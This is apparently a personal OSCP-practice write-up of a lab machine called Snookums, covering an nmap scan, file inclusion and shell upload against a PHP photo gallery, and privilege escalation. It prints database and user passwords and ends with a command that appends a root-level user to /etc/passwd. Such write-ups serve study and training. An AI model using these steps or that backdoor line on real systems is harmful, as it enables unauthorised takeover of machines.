@@ -1,0 +1,292 @@
+**Start 11:07 05-01-2025**
+
+---
+```
+Scope:
+192.168.195.58
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV -oN nmap 192.168.195.58 -T5 -vvvv --min-rate=5000 -sT -p-
+
+PORT      STATE  SERVICE     REASON       VERSION
+21/tcp    open   ftp         syn-ack      vsftpd 3.0.2
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.186
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp    open   ssh         syn-ack      OpenSSH 7.4 (protocol 2.0)
+80/tcp    open   http        syn-ack      Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-title: Simple PHP Photo Gallery
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+111/tcp   open   rpcbind     syn-ack      2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+139/tcp   open   netbios-ssn syn-ack      Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp   open   netbios-ssn syn-ack      Samba smbd 4.10.4 (workgroup: SAMBA)
+3306/tcp  open   mysql       syn-ack      MySQL (unauthorized)
+6958/tcp  closed unknown     conn-refused
+13158/tcp closed unknown     conn-refused
+21774/tcp closed unknown     conn-refused
+27060/tcp closed unknown     conn-refused
+32516/tcp closed unknown     conn-refused
+33060/tcp open   mysqlx?     syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|_    HY000
+36729/tcp closed unknown     conn-refused
+44441/tcp closed unknown     conn-refused
+46152/tcp closed unknown     conn-refused
+48875/tcp closed unknown     conn-refused
+51006/tcp closed unknown     conn-refused
+60056/tcp closed unknown     conn-refused
+61940/tcp closed unknown     conn-refused
+62661/tcp closed unknown     conn-refused
+
+Service Info: Host: SNOOKUMS; OS: Unix
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.10.4)
+|   Computer name: snookums
+|   NetBIOS computer name: SNOOKUMS\x00
+|   Domain name: \x00
+|   FQDN: snookums
+```
+
+Since we had 2 SMB ports open I reran with `--script smb-vuln*` for good measure:
+
+```bash
+PORT    STATE SERVICE     REASON  VERSION
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)
+Service Info: Host: SNOOKUMS
+
+Host script results:
+| smb-vuln-regsvc-dos: 
+|   VULNERABLE:
+|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
+|     State: VULNERABLE
+|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
+|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
+|       while working on smb-enum-sessions.
+|_          
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+```
+
+Starting off we notice that we are allowed to log into `ftp - 21` as `anonymous`.
+
+![](../../../assets/c3e5d269e2b352aea37296d888981a30.png)
+
+Unfortunately enough the service kept hanging and gave no valuable output.
+
+>[!note]
+>This was also mentioned in the nmap scan `Can't get directory listing: TIMEOUT`
+
+Then we have a webpage called **Simple Photo Gallery** running on **Apache, CentOS**.
+
+Furthermore we have 2 **MySQL** ports and a bunch of higher number ports that seem to be *closed*.
+
+We also have `port 111 - rpcbind` which I haven't heard of before:
+
+![](../../../assets/8b4842f0f8182f8613168ef0bd7e3839.png)
+
+For this port I've found [this blog](https://hackviser.com/tactics/pentesting/services/rpcbind) on how to pentest it. For now I've confirmed that it is open:
+
+![](../../../assets/e6ed137e1b65601d6b37760dc80f0b34.png)
+
+
+# Initial Foothold 
+
+## 80/TCP - HTTP
+
+Learning from past boxes I understood that I had to **KISS** and go with the most logical simple vector first.
+
+![](../../../assets/9902d07d5744550816ab72376a7f5266.png)
+
+I looked up this version online and lo and behold:
+
+![](../../../assets/cfc7b2571928b55b5befbe463a23b329.png)
+
+>[!note]
+>I also found a PoC for `0.8` on exploit-db but that one did not work.
+
+![](../../../assets/ff90b688040f57bb78b73ba71e98c74c.png)
+
+Let's test it out.
+
+![](../../../assets/96b302448a053732457788ee36187190.png)
+
+Perfect, directory traversal works. Now let's upload a shell.
+
+![](../../../assets/476f2090230275168781e8838c64ce4f.png)
+
+But the reverse shell did not fire.
+
+![](../../../assets/4892a117853e7302642f1d86580b89b4.png)
+
+>[!important]
+>I changed the mtu settings to `mtu 1250` and the port to `445` and the shell fired this time.
+>
+
+![](../../../assets/86e1b353295bf4deb137e1841d3ae506.png)
+
+
+## Enumeration
+
+Good, we're in.
+
+I quickly found out that we do not have sufficient permissions to enter the `/home/michael` directory.
+
+![](../../../assets/edd4e643adbd6d8edc5f83e2ba2acb85.png)
+
+I could not run `sudo -l` either because of the lack of a password.
+
+
+>[!note]
+>I upgraded my shell using the following commands:
+
+```bash
+# Spawn python shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Export TERM
+export TERM=xterm
+```
+
+I checked `crontab` but couldn't find anything.
+There was also nothing inside the binary files that stood out.
+
+I then started enumerating the web root:
+
+![](../../../assets/8f9f7474f77abc431aecfc5d5fa2ef6f.png)
+
+`db.php` sounds interesting!
+
+```php
+<?php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'MalapropDoffUtilize1337');
+define('DBNAME', 'SimplePHPGal');
+?>
+```
+
+Awesome, finally some creds.
+
+![](../../../assets/d33eb37e51a8a95af75deca0b04bd974.png)
+
+Awesome, we got db access.
+
+>[!note]
+>We keep in mind that there are 2 ports available, where the non-default is on 33060 which we could check out if this one doesn't have what we need.
+
+![](../../../assets/b9d7a2872882f2c6f9a06975f1b14e78.png)
+
+Awesome, we got 3 users and their encrypted hashes. Let's decrypt them
+
+```
+VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
+U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
+VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
+```
+
+![](../../../assets/36d1048efe424709b01413cb98ad5026.png)
+
+Well that's unfortunate, let's use john or hashcat then.
+
+![](../../../assets/13ea6e712d5dfbecf28a356c34d2706e.png)
+
+Got it, they're *double* base64 encrypted.
+
+![](../../../assets/9464b4db6e9c13d17a7eafc16474e36c.png)
+
+```creds
+michael HockSydneyCertify123
+josh MobilizeHissSeedtime747
+serena OverallCrestLean000
+```
+
+>[!note]
+>Quick FYI, port `33060` had the exact same database info, nothing different.
+
+![](../../../assets/73b98188220025a3d61b9fb08e93bf46.png)
+
+We have successfully logged in as *Michael*.
+
+### local.txt
+
+![](../../../assets/6656d032eda4b91dad094375250ce3f8.png)
+
+Unfortunately we weren't able to check `sudo -l` nor log in as `root` with the other creds found:
+
+![](../../../assets/f80ed494ad039197743443a5e97df4ad.png)
+
+
+# Privilege Escalation
+
+Since we had Michael's password there was no longer a need for the reverse shell, instead I went and logged in via SSH in order to get a stable shell.
+
+From here I transferred `linpeas.sh` to speed up the enumeration process.
+
+I fired it up and started looking for interesting bits.
+
+
+## More Enumeration
+
+![](../../../assets/43857f10fb15caf75200cfa23c5b6dbd.png)
+
+![](../../../assets/3395b42f9796af62cb76da3396398241.png)
+
+But above all others:
+
+![](../../../assets/9967ef5abe34dc29bef13be4e3ab1341.png)
+![](../../../assets/30b71462460d95ef05e033c07858f5ca.png)
+
+This means we can go ahead and a new user `root2` with the same privileges as `root`.
+
+To put this in practice it will look somewhat like this:
+
+```bash
+# Add new user root2 - w00t
+echo "root2:nYEMRr1PQFYBg:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# Change to new user
+su root2
+```
+
+![](../../../assets/1108647d0a4770a82553d6ab8c9df581.png)
+
+It worked!!!
+
+### proof.txt
+
+![](../../../assets/a1579545b0d4cad8e1cf232cd679117f.png)
+
+---
+
+**Finished 12:49 05-01-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#enumeration #priv-esc 
